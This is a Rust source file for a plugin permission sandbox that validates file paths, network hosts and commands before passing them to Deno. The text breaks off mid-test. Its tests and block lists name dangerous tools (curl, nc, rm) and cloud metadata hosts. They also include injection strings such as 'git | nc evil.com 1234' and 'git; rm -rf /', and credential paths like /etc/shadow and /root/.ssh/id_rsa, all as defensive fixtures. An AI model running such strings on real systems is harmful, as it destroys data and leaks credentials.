use anyhow::Result;
use std::path::Path;
use url;

/// Represents the security permissions required for plugin execution
#[derive(Debug, Clone)]
pub struct PluginPermissions {
    pub file_read: Vec<String>,
    pub file_write: Vec<String>,
    pub env_access: bool,
    pub network: Vec<String>,
    pub run_commands: Vec<String>,
}

/// Security validation functions
impl PluginPermissions {
    /// Validate and sanitize a file path to prevent dangerous access
    fn validate_file_path(path: &str) -> Result<String, String> {
        // Block empty paths
        if path.trim().is_empty() {
            return Err("Empty path not allowed".to_string());
        }

        // Block path traversal attempts
        if path.contains("..") {
            return Err(format!("Path traversal not allowed: {}", path));
        }

        // Block access to sensitive system directories
        let dangerous_paths = [
            "/etc/",
            "/root/",
            "/sys/",
            "/proc/",
            "/dev/",
            "/tmp/",
            "/boot/",
            "/usr/bin/",
            "/usr/sbin/",
            "/bin/",
            "/sbin/",
            "C:\\Windows\\",
            "C:\\Program Files\\",
            "C:\\Users\\",
            "C:\\temp\\",
            "/System/",
            "/Library/",
            "/Applications/",
        ];

        for dangerous in &dangerous_paths {
            if path.starts_with(dangerous) {
                return Err(format!("Access to system directory not allowed: {}", path));
            }
        }

        Ok(path.to_string())
    }

    /// Validate network domain/IP to prevent wildcards and dangerous access
    fn validate_network_domain(domain: &str) -> Result<String, String> {
        // Normalize input: trim whitespace and convert to lowercase
        let normalized_domain = domain.trim().to_lowercase();

        // Block empty domains (after normalization)
        if normalized_domain.is_empty() {
            return Err("Empty domain not allowed".to_string());
        }

        // Block wildcard patterns
        if normalized_domain.contains('*') {
            return Err(format!("Wildcard domains not allowed: {}", domain));
        }

        // Block dangerous IPs that could grant broad access
        let dangerous_ips = ["0.0.0.0", "::", "localhost", "127.0.0.1", "::1"];
        for dangerous in &dangerous_ips {
            if normalized_domain == *dangerous {
                return Err(format!("Broad network access not allowed: {}", domain));
            }
        }

        // Block cloud metadata services (comprehensive list)
        let metadata_hosts = [
            // AWS metadata services
            "169.254.169.254",
            "instance-data.ec2.internal",
            // Google Cloud metadata services
            "100.100.100.200",
            "metadata.google.internal",
            // Azure metadata services
            "169.254.169.254", // Same IP as AWS but worth being explicit
            "metadata.azure.com",
            // Alibaba Cloud metadata services
            "100.100.100.200", // Same as Google but different cloud
            // Common bypass attempts
            "169.254.169.254.nip.io", // nip.io DNS bypass
            "169.254.169.254.xip.io", // xip.io DNS bypass
            "metadata",               // Generic metadata hostname
            "169-254-169-254.nip.io", // Alternative nip.io format
            "metadata.local",         // Local metadata attempt
        ];

        for metadata_host in &metadata_hosts {
            if normalized_domain == *metadata_host {
                return Err(format!(
                    "Cloud metadata service access not allowed: {}",
                    domain
                ));
            }
        }

        // Block private network ranges (could be used for internal attacks)
        if normalized_domain.starts_with("192.168.")
            || normalized_domain.starts_with("10.")
            || normalized_domain.starts_with("172.")
        {
            return Err(format!("Private network access not allowed: {}", domain));
        }

        // Return the normalized domain
        Ok(normalized_domain)
    }

    /// Validate command to prevent injection and dangerous operations
    fn validate_command(command: &str) -> Result<String, String> {
        // Block empty commands
        if command.trim().is_empty() {
            return Err("Empty command not allowed".to_string());
        }

        // Block commands with arguments (potential injection)
        if command.contains(' ') || command.contains('\t') {
            return Err(format!("Commands with arguments not allowed: {}", command));
        }

        // Block shell operators that could enable chaining/injection
        let dangerous_chars = ['&', '|', ';', '>', '<', '`', '$', '(', ')', '{', '}'];
        for dangerous in &dangerous_chars {
            if command.contains(*dangerous) {
                return Err(format!(
                    "Command contains dangerous characters: {}",
                    command
                ));
            }
        }

        // Block inherently dangerous commands
        let dangerous_commands = [
            "rm", "del", "format", "fdisk", "dd", "mkfs", "sudo", "su", "chmod", "chown", "passwd",
            "curl", "wget", "nc", "netcat", "telnet", "ssh", "scp", "rsync", "ftp", "eval", "exec",
        ];

        for dangerous in &dangerous_commands {
            if command == *dangerous {
                return Err(format!("Dangerous command not allowed: {}", command));
            }
        }

        Ok(command.to_string())
    }
}

impl PluginPermissions {
    /// Create safe conservative defaults that work for most plugins
    pub fn safe_defaults(project_root: &Path) -> Self {
        Self {
            // Allow reading project files and .makeitso directory
            file_read: vec![
                project_root.to_string_lossy().to_string(),
                ".makeitso".to_string(),
            ],
            // Allow writing to project directory only
            file_write: vec![project_root.to_string_lossy().to_string()],
            // Allow environment access (needed for many plugins)
            env_access: true,
            // No network access by default
            network: vec![],
            // No command execution by default
            run_commands: vec![],
        }
    }

    /// Convert permissions to Deno command-line arguments
    pub fn to_deno_args(&self) -> Vec<String> {
        let mut args = Vec::new();

        // File read permissions
        if !self.file_read.is_empty() {
            args.push(format!("--allow-read={}", self.file_read.join(",")));
        }

        // File write permissions
        if !self.file_write.is_empty() {
            args.push(format!("--allow-write={}", self.file_write.join(",")));
        }

        // Environment access
        if self.env_access {
            args.push("--allow-env".to_string());
        }

        // Network access (only if explicitly granted)
        if !self.network.is_empty() {
            args.push(format!("--allow-net={}", self.network.join(",")));
        }

        // Command execution (only if explicitly granted)
        if !self.run_commands.is_empty() {
            args.push(format!("--allow-run={}", self.run_commands.join(",")));
        }

        args
    }

    /// Add additional file read permissions with security validation
    pub fn allow_read<P: AsRef<Path>>(&mut self, path: P) -> &mut Self {
        let path_str = path.as_ref().to_string_lossy().to_string();
        match Self::validate_file_path(&path_str) {
            Ok(validated_path) => {
                // Avoid duplicates
                if !self.file_read.contains(&validated_path) {
                    self.file_read.push(validated_path);
                }
            }
            Err(err) => {
                eprintln!("⚠️  Security warning: Blocked dangerous read path: {}", err);
                // For v1.0, we silently block dangerous paths rather than panicking
                // This prevents plugins from accidentally breaking the system
            }
        }
        self
    }

    /// Add additional file write permissions with security validation
    pub fn allow_write<P: AsRef<Path>>(&mut self, path: P) -> &mut Self {
        let path_str = path.as_ref().to_string_lossy().to_string();
        match Self::validate_file_path(&path_str) {
            Ok(validated_path) => {
                // Avoid duplicates
                if !self.file_write.contains(&validated_path) {
                    self.file_write.push(validated_path);
                }
            }
            Err(err) => {
                eprintln!(
                    "⚠️  Security warning: Blocked dangerous write path: {}",
                    err
                );
            }
        }
        self
    }

    /// Add network permissions for specific domains with security validation
    pub fn allow_network<S: AsRef<str>>(&mut self, domain: S) -> &mut Self {
        let domain_str = domain.as_ref();
        match Self::validate_network_domain(domain_str) {
            Ok(validated_domain) => {
                // Avoid duplicates
                if !self.network.contains(&validated_domain) {
                    self.network.push(validated_domain);
                }
            }
            Err(err) => {
                eprintln!(
                    "⚠️  Security warning: Blocked dangerous network access: {}",
                    err
                );
            }
        }
        self
    }

    /// Add permission to run specific commands with security validation
    pub fn allow_run<S: AsRef<str>>(&mut self, command: S) -> &mut Self {
        let command_str = command.as_ref();
        match Self::validate_command(command_str) {
            Ok(validated_command) => {
                // Avoid duplicates
                if !self.run_commands.contains(&validated_command) {
                    self.run_commands.push(validated_command);
                }
            }
            Err(err) => {
                eprintln!("⚠️  Security warning: Blocked dangerous command: {}", err);
            }
        }
        self
    }
}

/// Build permissions for a plugin execution
///
/// This function implements the permission inheritance system:
/// 1. Start with safe defaults
/// 2. Apply plugin-level permissions (with automatic validation)
/// 3. Apply command-specific permissions (with automatic validation)
///
/// Security validation occurs automatically within each permission type:
/// - File paths are validated for path traversal and system directory access
/// - Network domains are validated against localhost, private IPs, and wildcards
/// - Commands are validated against injection and dangerous operations
/// - Invalid permissions are blocked with warning messages but don't fail the build
pub fn build_plugin_permissions(
    project_root: &Path,
    plugin_manifest: &crate::models::PluginManifest,
    command_name: &str,
) -> Result<PluginPermissions> {
    // 1. Start with safe defaults
    let mut permissions = PluginPermissions::safe_defaults(project_root);

    // 2. Apply plugin-level permissions
    if let Some(plugin_perms) = &plugin_manifest.permissions {
        apply_security_permissions(&mut permissions, plugin_perms, "plugin-level")?;
    }

    // 3. Apply command-specific permissions
    if let Some(command) = plugin_manifest.commands.get(command_name) {
        if let Some(command_perms) = &command.permissions {
            apply_security_permissions(
                &mut permissions,
                command_perms,
                &format!("command '{}'", command_name),
            )?;
        }
    }

    Ok(permissions)
}

/// Apply security permissions from manifest configuration to PluginPermissions
///
/// Each permission type is automatically validated through the allow_* methods:
///
/// Dangerous permissions are blocked with warning messages but don't cause failure.
fn apply_security_permissions(
    permissions: &mut PluginPermissions,
    config_perms: &crate::models::SecurityPermissions,
    context: &str,
) -> Result<()> {
    // Apply file read permissions
    for path in &config_perms.file_read {
        permissions.allow_read(path);
    }

    // Apply file write permissions
    for path in &config_perms.file_write {
        permissions.allow_write(path);
    }

    // Apply environment access (explicit override)
    if let Some(env_access) = config_perms.env_access {
        permissions.env_access = env_access;
    }

    // Apply network permissions
    for domain in &config_perms.network {
        permissions.allow_network(domain);
    }

    // Apply run command permissions
    for command in &config_perms.run_commands {
        permissions.allow_run(command);
    }

    Ok(())
}

/// Legacy function for backward compatibility - uses safe defaults only
pub fn build_plugin_permissions_legacy(project_root: &Path) -> Result<PluginPermissions> {
    // For plugins without manifest-declared permissions, use safe defaults
    Ok(PluginPermissions::safe_defaults(project_root))
}

/// Validate a registry URL for security
pub fn validate_registry_url(url: &str) -> Result<String, String> {
    validate_url_for_git_operations(url, "registry")
}

/// Core URL validation for git operations (registries)
pub fn validate_url_for_git_operations(url: &str, context: &str) -> Result<String, String> {
    // Check for empty or whitespace-only URLs
    if url.trim().is_empty() {
        return Err(format!("Empty {} URL not allowed", context));
    }

    let url_trimmed = url.trim();

    // Handle SSH git URLs (special case - these are legitimate)
    if url_trimmed.starts_with("git@") {
        // SSH URLs like git@github.com:user/repo.git are safe
        // They don't have schemes so URL parsing would fail
        return Ok(url_trimmed.to_string());
    }

    // Check for IPv6 localhost patterns before URL parsing (which might fail)
    if url_trimmed.contains("::1") {
        return Err(format!(
            "localhost/loopback access not allowed for {} URLs",
            context
        ));
    }

    // Parse the URL to extract components
    let parsed_url = url::Url::parse(url_trimmed)
        .map_err(|_| format!("Invalid {} URL format: {}", context, url_trimmed))?;

    let scheme = parsed_url.scheme();
    let host = parsed_url.host_str().unwrap_or("");

    // Check dangerous schemes first (they might not have hosts)
    match scheme {
        "file" => return Err("file:// URLs not allowed for security reasons".to_string()),
        "javascript" | "data" | "ftp" => {
            return Err(format!("Dangerous scheme '{}' not allowed", scheme));
        }
        _ => {} // Continue with other validation
    }

    // Validate the host (this gives more specific error messages for network issues)
    validate_host_for_external_access(host, context)?;

    // Then validate remaining schemes
    match scheme {
        "http" => {
            // Allow HTTP only for certain trusted domains
            if !is_trusted_git_domain(host) {
                return Err("HTTPS required for remote repositories (HTTP is insecure)".to_string());
            }
        }
        "https" | "ssh" | "git" => {
            // These schemes are generally safe
        }
        _ => {
            return Err(format!(
                "Unsupported scheme '{}' for {} URLs",
                scheme, context
            ));
        }
    }

    Ok(url_trimmed.to_string())
}

/// Validate that a host is safe for external access
pub fn validate_host_for_external_access(host: &str, context: &str) -> Result<(), String> {
    if host.is_empty() {
        return Err(format!("Empty host not allowed for {} URLs", context));
    }

    // Block localhost and loopback addresses (including IPv6)
    if host == "localhost" || host == "127.0.0.1" || host == "::1" || host.starts_with("[::1]") {
        return Err(format!(
            "localhost/loopback access not allowed for {} URLs",
            context
        ));
    }

    // Block cloud metadata services
    if host == "169.254.169.254" || host == "100.100.100.200" {
        return Err("Cloud metadata service access not allowed".to_string());
    }

    // Block private network ranges
    if is_private_ip(host) {
        return Err(format!(
            "Private network access not allowed for {} URLs",
            context
        ));
    }

    Ok(())
}

/// Check if an IP address is in a private network range
pub fn is_private_ip(host: &str) -> bool {
    // Check IPv4 private ranges
    if host.starts_with("192.168.") {
        return true;
    }

    if host.starts_with("10.") {
        return true;
    }

    // 172.16.0.0 to 172.31.255.255
    if host.starts_with("172.") {
        if let Some(second_octet) = host.split('.').nth(1) {
            if let Ok(num) = second_octet.parse::<u8>() {
                if (16..=31).contains(&num) {
                    return true;
                }
            }
        }
    }

    // Note: We're not blocking all RFC 1918 ranges or IPv6 private ranges
    // for simplicity, but this covers the most common private networks
    false
}

/// Check if a domain is trusted for git operations (allows HTTP)
pub fn is_trusted_git_domain(_host: &str) -> bool {
    // For now, we don't have any domains that we trust with HTTP
    // All git operations should use HTTPS for security
    // This function exists for future extensibility
    false
}

/// Validate a Deno dependency URL for security
pub fn validate_deno_dependency_url(url: &str) -> Result<String, String> {
    validate_url_for_dependencies(url)
}

/// Core URL validation for dependencies
pub fn validate_url_for_dependencies(url: &str) -> Result<String, String> {
    // Check for empty or whitespace-only URLs
    if url.trim().is_empty() {
        return Err("Empty dependency URL not allowed".to_string());
    }

    let url_trimmed = url.trim();

    // Block relative paths that could be injection attempts
    if url_trimmed.starts_with("../") || url_trimmed.contains("/../") {
        return Err("Relative path injection not allowed in dependency URLs".to_string());
    }

    // Check for IPv6 localhost patterns before URL parsing (which might fail)
    if url_trimmed.contains("::1") {
        return Err("localhost/loopback access not allowed for dependency URLs".to_string());
    }

    // Parse the URL to extract components
    let parsed_url = url::Url::parse(url_trimmed)
        .map_err(|_| format!("Invalid dependency URL format: {}", url_trimmed))?;

    let scheme = parsed_url.scheme();
    let host = parsed_url.host_str().unwrap_or("");

    // Check dangerous schemes first (they might not have hosts)
    match scheme {
        "file" => return Err("file:// scheme not allowed for dependencies".to_string()),
        "javascript" | "data" | "ftp" | "mailto" => {
            return Err(format!(
                "Dangerous scheme '{}' not allowed for dependencies",
                scheme
            ));
        }
        _ => {} // Continue with other validation
    }

    // Validate the host (this gives more specific error messages for network issues)
    validate_host_for_external_access(host, "dependency")?;

    // Then validate remaining schemes
    match scheme {
        "http" => {
            // Require HTTPS for all remote dependencies (stricter than git)
            return Err("HTTPS required for remote dependencies (HTTP is insecure)".to_string());
        }
        "https" => {
            // HTTPS is safe for dependencies
        }
        _ => {
            return Err(format!(
                "Unsupported scheme '{}' for dependency URLs",
                scheme
            ));
        }
    }

    Ok(url_trimmed.to_string())
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::path::PathBuf;

    #[test]
    fn test_safe_defaults() {
        let project_root = PathBuf::from("/test/project");
        let permissions = PluginPermissions::safe_defaults(&project_root);

        assert_eq!(permissions.file_read, vec!["/test/project", ".makeitso"]);
        assert_eq!(permissions.file_write, vec!["/test/project"]);
        assert_eq!(permissions.env_access, true);
        assert_eq!(permissions.network, Vec::<String>::new());
        assert_eq!(permissions.run_commands, Vec::<String>::new());
    }

    #[test]
    fn test_to_deno_args_minimal() {
        let project_root = PathBuf::from("/test/project");
        let permissions = PluginPermissions::safe_defaults(&project_root);
        let args = permissions.to_deno_args();

        assert_eq!(
            args,
            vec![
                "--allow-read=/test/project,.makeitso",
                "--allow-write=/test/project",
                "--allow-env"
            ]
        );
    }

    #[test]
    fn test_to_deno_args_with_network() {
        let project_root = PathBuf::from("/test/project");
        let mut permissions = PluginPermissions::safe_defaults(&project_root);
        permissions
            .allow_network("api.github.com")
            .allow_network("registry.npmjs.org");

        let args = permissions.to_deno_args();

        assert!(args.contains(&"--allow-net=api.github.com,registry.npmjs.org".to_string()));
    }

    #[test]
    fn test_to_deno_args_with_run_commands() {
        let project_root = PathBuf::from("/test/project");
        let mut permissions = PluginPermissions::safe_defaults(&project_root);
        permissions.allow_run("git").allow_run("npm");

        let args = permissions.to_deno_args();

        assert!(args.contains(&"--allow-run=git,npm".to_string()));
    }

    #[test]
    fn test_absolute_system_path_injection() {
        let project_root = PathBuf::from("/test/project");
        let mut permissions = PluginPermissions::safe_defaults(&project_root);

        // Attempt to access sensitive system files - these should be blocked
        permissions.allow_read("/etc/passwd");
        permissions.allow_read("/etc/shadow");
        permissions.allow_read("C:\\Windows\\System32\\config\\SAM");
        permissions.allow_write("/etc/crontab");
        permissions.allow_write("/tmp/backdoor"); // /tmp is a system directory

        let args = permissions.to_deno_args();

        // Verify system paths were blocked
        let read_arg = args
            .iter()
            .find(|arg| arg.starts_with("--allow-read="))
            .unwrap();
        assert!(
            !read_arg.contains("/etc/passwd"),
            "System file access should be blocked"
        );
        assert!(
            !read_arg.contains("/etc/shadow"),
            "System file access should be blocked"
        );
        assert!(
            !read_arg.contains("C:\\Windows\\System32"),
            "System directory access should be blocked"
        );

        // Write arg should only contain project root since system writes were blocked
        let write_arg = args
            .iter()
            .find(|arg| arg.starts_with("--allow-write="))
            .unwrap();
        assert!(
            !write_arg.contains("/etc/crontab"),
            "System file write should be blocked"
        );
        assert!(
            !write_arg.contains("/tmp/backdoor"),
            "System directory write should be blocked"
        );
        assert_eq!(
            write_arg, "--allow-write=/test/project",
            "Should only contain safe project path"
        );

        // Should only contain safe defaults
        assert!(read_arg.contains("/test/project"));
    }

    #[test]
    fn test_builder_pattern() {
        let project_root = PathBuf::from("/test/project");
        let mut permissions = PluginPermissions::safe_defaults(&project_root);

        // Use safe paths that won't be blocked by our security validation
        permissions
            .allow_read("./vendor/certs") // Relative path, safe
            .allow_write("./dist")
            .allow_network("api.example.com")
            .allow_run("docker");

        let args = permissions.to_deno_args();

        // Verify safe permissions were allowed
        assert!(args.contains(&"--allow-read=/test/project,.makeitso,./vendor/certs".to_string()));
        assert!(args.contains(&"--allow-write=/test/project,./dist".to_string()));
        assert!(args.contains(&"--allow-net=api.example.com".to_string()));
        assert!(args.contains(&"--allow-run=docker".to_string()));
    }

    #[test]
    fn test_build_plugin_permissions() {
        let project_root = PathBuf::from("/test/project");
        let result = build_plugin_permissions_legacy(&project_root);

        assert!(result.is_ok());
        let permissions = result.unwrap();

        // Should return safe defaults for now
        assert_eq!(permissions.file_read, vec!["/test/project", ".makeitso"]);
        assert_eq!(permissions.env_access, true);
        assert_eq!(permissions.network, Vec::<String>::new());
    }

    // ========== NEW PERMISSION SYSTEM TESTS ==========

    #[test]
    fn test_plugin_level_permissions() {
        use crate::models::{PluginManifest, PluginMeta, SecurityPermissions};
        use std::collections::HashMap;

        let project_root = PathBuf::from("/test/project");

        let plugin_permissions = SecurityPermissions {
            file_read: vec!["./config".to_string(), "./data".to_string()],
            file_write: vec!["./output".to_string()],
            env_access: Some(false), // Override default
            network: vec!["api.github.com".to_string()],
            run_commands: vec!["git".to_string()],
        };

        let manifest = PluginManifest {
            plugin: PluginMeta {
                name: "test-plugin".to_string(),
                description: None,
                version: "1.0.0".to_string(),
                registry: None,
            },
            commands: HashMap::new(),
            deno_dependencies: HashMap::new(),
            permissions: Some(plugin_permissions),
        };

        let result = build_plugin_permissions(&project_root, &manifest, "test-command");
        assert!(result.is_ok());
        let permissions = result.unwrap();

        // Should have safe defaults plus plugin permissions
        assert!(permissions.file_read.contains(&"/test/project".to_string()));
        assert!(permissions.file_read.contains(&".makeitso".to_string()));
        assert!(permissions.file_read.contains(&"./config".to_string()));
        assert!(permissions.file_read.contains(&"./data".to_string()));

        assert!(
            permissions
                .file_write
                .contains(&"/test/project".to_string())
        );
        assert!(permissions.file_write.contains(&"./output".to_string()));

        assert_eq!(permissions.env_access, false); // Overridden by plugin config
        assert!(permissions.network.contains(&"api.github.com".to_string()));
        assert!(permissions.run_commands.contains(&"git".to_string()));
    }

    #[test]
    fn test_command_level_permissions_extend_plugin() {
        use crate::models::{PluginCommand, PluginManifest, PluginMeta, SecurityPermissions};
        use std::collections::HashMap;

        let project_root = PathBuf::from("/test/project");

        let plugin_permissions = SecurityPermissions {
            file_read: vec!["./config".to_string()],
            network: vec!["api.github.com".to_string()],
            run_commands: vec!["git".to_string()],
            ..Default::default()
        };

        let command_permissions = SecurityPermissions {
            file_read: vec!["./secret-config".to_string()],
            network: vec!["docker.io".to_string()],
            run_commands: vec!["docker".to_string()],
            ..Default::default()
        };

        let mut commands = HashMap::new();
        commands.insert(
            "deploy".to_string(),
            PluginCommand {
                script: "./deploy.ts".to_string(),
                description: None,
                instructions: None,
                args: None,
                permissions: Some(command_permissions),
            },
        );

        let manifest = PluginManifest {
            plugin: PluginMeta {
                name: "test-plugin".to_string(),
                description: None,
                version: "1.0.0".to_string(),
                registry: None,
            },
            commands,
            deno_dependencies: HashMap::new(),
            permissions: Some(plugin_permissions),
        };

        let result = build_plugin_permissions(&project_root, &manifest, "deploy");
        assert!(result.is_ok());
        let permissions = result.unwrap();

        // Should have both plugin and command permissions
        assert!(permissions.file_read.contains(&"./config".to_string()));
        assert!(
            permissions
                .file_read
                .contains(&"./secret-config".to_string())
        );

        assert!(permissions.network.contains(&"api.github.com".to_string()));
        assert!(permissions.network.contains(&"docker.io".to_string()));

        assert!(permissions.run_commands.contains(&"git".to_string()));
        assert!(permissions.run_commands.contains(&"docker".to_string()));
    }

    #[test]
    fn test_command_without_permissions_inherits_plugin() {
        use crate::models::{PluginCommand, PluginManifest, PluginMeta, SecurityPermissions};
        use std::collections::HashMap;

        let project_root = PathBuf::from("/test/project");

        let plugin_permissions = SecurityPermissions {
            file_read: vec!["./config".to_string()],
            network: vec!["api.github.com".to_string()],
            run_commands: vec!["git".to_string()],
            ..Default::default()
        };

        let mut commands = HashMap::new();
        commands.insert(
            "status".to_string(),
            PluginCommand {
                script: "./status.ts".to_string(),
                description: None,
                instructions: None,
                args: None,
                permissions: None, // No command-specific permissions
            },
        );

        let manifest = PluginManifest {
            plugin: PluginMeta {
                name: "test-plugin".to_string(),
                description: None,
                version: "1.0.0".to_string(),
                registry: None,
            },
            commands,
            deno_dependencies: HashMap::new(),
            permissions: Some(plugin_permissions),
        };

        let result = build_plugin_permissions(&project_root, &manifest, "status");
        assert!(result.is_ok());
        let permissions = result.unwrap();

        // Should have only plugin permissions (no command-specific additions)
        assert!(permissions.file_read.contains(&"./config".to_string()));
        assert!(permissions.network.contains(&"api.github.com".to_string()));
        assert!(permissions.run_commands.contains(&"git".to_string()));

        // Should not have any unexpected additions
        assert_eq!(permissions.network.len(), 1);
        assert_eq!(permissions.run_commands.len(), 1);
    }

    #[test]
    fn test_no_permissions_declared_uses_safe_defaults() {
        use crate::models::{PluginCommand, PluginManifest, PluginMeta};
        use std::collections::HashMap;

        let project_root = PathBuf::from("/test/project");

        let mut commands = HashMap::new();
        commands.insert(
            "basic".to_string(),
            PluginCommand {
                script: "./basic.ts".to_string(),
                description: None,
                instructions: None,
                args: None,
                permissions: None,
            },
        );

        let manifest = PluginManifest {
            plugin: PluginMeta {
                name: "test-plugin".to_string(),
                description: None,
                version: "1.0.0".to_string(),
                registry: None,
            },
            commands,
            deno_dependencies: HashMap::new(),
            permissions: None, // No plugin-level permissions
        };

        let result = build_plugin_permissions(&project_root, &manifest, "basic");
        assert!(result.is_ok());
        let permissions = result.unwrap();

        // Should have only safe defaults
        assert_eq!(permissions.file_read, vec!["/test/project", ".makeitso"]);
        assert_eq!(permissions.file_write, vec!["/test/project"]);
        assert_eq!(permissions.env_access, true);
        assert_eq!(permissions.network, Vec::<String>::new());
        assert_eq!(permissions.run_commands, Vec::<String>::new());
    }

    #[test]
    fn test_security_validation_still_blocks_dangerous_permissions() {
        use crate::models::{PluginManifest, PluginMeta, SecurityPermissions};
        use std::collections::HashMap;

        let project_root = PathBuf::from("/test/project");

        let dangerous_permissions = SecurityPermissions {
            file_read: vec!["../../../etc/passwd".to_string()], // Path traversal
            network: vec!["localhost".to_string()],             // Localhost access
            run_commands: vec!["rm".to_string()],               // Dangerous command
            ..Default::default()
        };

        let manifest = PluginManifest {
            plugin: PluginMeta {
                name: "malicious-plugin".to_string(),
                description: None,
                version: "1.0.0".to_string(),
                registry: None,
            },
            commands: HashMap::new(),
            deno_dependencies: HashMap::new(),
            permissions: Some(dangerous_permissions),
        };

        let result = build_plugin_permissions(&project_root, &manifest, "test-command");
        assert!(result.is_ok()); // Function doesn't fail, but permissions are blocked
        let permissions = result.unwrap();

        // Dangerous permissions should be blocked by validation
        let args = permissions.to_deno_args();

        let read_arg = args
            .iter()
            .find(|arg| arg.starts_with("--allow-read="))
            .unwrap();
        assert!(
            !read_arg.contains("../../../etc/passwd"),
            "Path traversal should be blocked"
        );

        let net_arg = args.iter().find(|arg| arg.starts_with("--allow-net="));
        assert!(net_arg.is_none(), "Localhost access should be blocked");

        let run_arg = args.iter().find(|arg| arg.starts_with("--allow-run="));
        assert!(run_arg.is_none(), "Dangerous commands should be blocked");
    }

    // ========== NEW COMPREHENSIVE SECURITY TESTS ==========

    #[test]
    fn test_toml_parsing_permission_structure() {
        // Test that permissions must be at root level, not under [plugin.permissions]
        let correct_toml = r#"
[plugin]
name = "test-plugin"
version = "1.0.0"

[permissions]
run_commands = ["git"]

[commands.test]
script = "./test.ts"
"#;

        let parsed: Result<crate::models::PluginManifest, _> = toml::from_str(correct_toml);
        assert!(parsed.is_ok(), "Correct TOML structure should parse");

        let manifest = parsed.unwrap();
        assert!(
            manifest.permissions.is_some(),
            "Permissions should be parsed"
        );
        assert_eq!(manifest.permissions.unwrap().run_commands, vec!["git"]);

        // Test incorrect structure (this would fail in real usage)
        let incorrect_toml = r#"
[plugin]
name = "test-plugin"  
version = "1.0.0"

[plugin.permissions]  # This is WRONG - should be [permissions]
run_commands = ["git"]

[commands.test]
script = "./test.ts"
"#;

        let parsed: Result<crate::models::PluginManifest, _> = toml::from_str(incorrect_toml);
        assert!(parsed.is_ok(), "Should parse but permissions will be None");

        let manifest = parsed.unwrap();
        assert!(
            manifest.permissions.is_none(),
            "Permissions should be None with incorrect structure"
        );
    }

    #[test]
    fn test_dangerous_commands_comprehensive() {
        let project_root = PathBuf::from("/test/project");
        let mut permissions = PluginPermissions::safe_defaults(&project_root);

        let dangerous_commands = vec![
            "rm", "del", "format", "fdisk", "dd", "mkfs", "sudo", "su", "chmod", "chown", "passwd",
            "curl", "wget", "nc", "netcat", "telnet", "ssh", "scp", "rsync", "ftp", "eval", "exec",
        ];

        for cmd in dangerous_commands {
            let initial_count = permissions.run_commands.len();
            permissions.allow_run(cmd);

            // Should not have been added
            assert_eq!(
                permissions.run_commands.len(),
                initial_count,
                "Dangerous command '{}' should not be added",
                cmd
            );
        }

        // Should still have empty run_commands (started with safe defaults)
        assert_eq!(permissions.run_commands, Vec::<String>::new());
    }

    #[test]
    fn test_command_injection_attempts() {
        let project_root = PathBuf::from("/test/project");
        let mut permissions = PluginPermissions::safe_defaults(&project_root);

        let injection_attempts = vec![
            "git; rm -rf /",          // Command chaining
            "git && rm -rf /",        // Command chaining
            "git || rm -rf /",        // Command chaining
            "git | nc evil.com 1234", // Piping
            "git > /etc/passwd",      // Redirection
            "git < /etc/shadow",      // Redirection
            "git `whoami`",           // Command substitution
            "git $(whoami)",          // Command substitution
            "git & background_evil",  // Background execution
            "git{dangerous}",         // Brace expansion attempt
            "git(dangerous)",         // Parentheses
        ];

        for cmd in injection_attempts {
            let initial_count = permissions.run_commands.len();
            permissions.allow_run(cmd);

            assert_eq!(
                permissions.run_commands.len(),
                initial_count,
                "Injection attempt '{}' should be blocked",
                cmd
            );
        }
    }

    #[test]
    fn test_path_traversal_attempts() {
        let project_root = PathBuf::from("/test/project");
        let mut permissions = PluginPermissions::safe_defaults(&project_root);

        let traversal_attempts = vec![
            "../../../etc/passwd",
            "../../../../../../etc/shadow",
            "/etc/passwd",
            "/root/.ssh/id_rsa",
            "/etc/shadow",
            "C:\\Windows\\System32\\config\\SAM",
            "C:\\Users\\Administrator\\NTUSER.DAT",
            "/System/Library/Security/authorization",
            "/Library/Preferences/SystemConfiguration/com.apple.airport.preferences.plist",
        ];

        let initial_read_count = permissions.file_read.len();
        let initial_write_count = permissions.file_write.len();

        for path in traversal_attempts {
            permissions.allow_read(path);
            permissions.allow_write(path);

            // Should not increase the count (paths should be blocked)
            assert_eq!(
                permissions.file_read.len(),
                initial_read_count,
                "Dangerous read path '{}' should be blocked",
                path
            );
            assert_eq!(
                permissions.file_write.len(),
                initial_write_count,
                "Dangerous write path '{}' should be blocked",
                path
            );
        }
    }

    #[test]
    fn test_network_security_validation() {
        let project_root = PathBuf::from("/test/project");
        let mut permissions = PluginPermissions::safe_defaults(&project_root);

        let dangerous_domains = vec![
            "localhost",
            "127.0.0.1",
            "::1",
            "0.0.0.0",
            "::",
            "*.evil.com",      // Wildcard
            "evil.*.com",      // Wildcard
            "192.168.1.1",     // Private network
            "10.0.0.1",        // Private network
            "172.16.0.1",      // Private network
            "169.254.169.254", // AWS metadata - should be blocked but not by private IP logic
            "100.100.100.200", // Alibaba Cloud metadata
        ];

        let initial_count = permissions.network.len();

        for domain in dangerous_domains {
            permissions.allow_network(domain);

            assert_eq!(
                permissions.network.len(),
                initial_count,
                "Dangerous network access '{}' should be blocked",
                domain
            );
        }
    }

    #[test]
    fn test_safe_commands_are_allowed() {
        let project_root = PathBuf::from("/test/project");
        let mut permissions = PluginPermissions::safe_defaults(&project_root);

        let safe_commands = vec![
            "git",
            "node",
            "npm",
            "yarn",
            "deno",
            "python",
            "python3",
            "cargo",
            "rustc",
            "go",
            "java",
            "javac",
            "make",
            "cmake",
            "docker",
            "kubectl",
            "terraform",
            "aws",
            "gcloud",
            "az",
        ];

        for cmd in &safe_commands {
            permissions.allow_run(cmd);
        }

        // All safe commands should be added
        assert_eq!(permissions.run_commands.len(), safe_commands.len());

        for cmd in safe_commands {
            assert!(
                permissions.run_commands.contains(&cmd.to_string()),
                "Safe command '{}' should be allowed",
                cmd
            );
        }
    }

    #[test]
    fn test_safe_paths_are_allowed() {
        let project_root = PathBuf::from("/test/project");
        let mut permissions = PluginPermissions::safe_defaults(&project_root);

        let safe_paths = vec![
            "./config",
            "./data",
            "./output",
            "./logs",
            "vendor/deps",
            "node_modules",
            ".git",
            "dist/output",
        ];

        let initial_read_count = permissions.file_read.len();
        let initial_write_count = permissions.file_write.len();

        for path in &safe_paths {
            permissions.allow_read(path);
            permissions.allow_write(path);
        }

        // All safe paths should be added
        assert_eq!(
            permissions.file_read.len(),
            initial_read_count + safe_paths.len()
        );
        assert_eq!(
            permissions.file_write.len(),
            initial_write_count + safe_paths.len()
        );
    }

    #[test]
    fn test_safe_networks_are_allowed() {
        let project_root = PathBuf::from("/test/project");
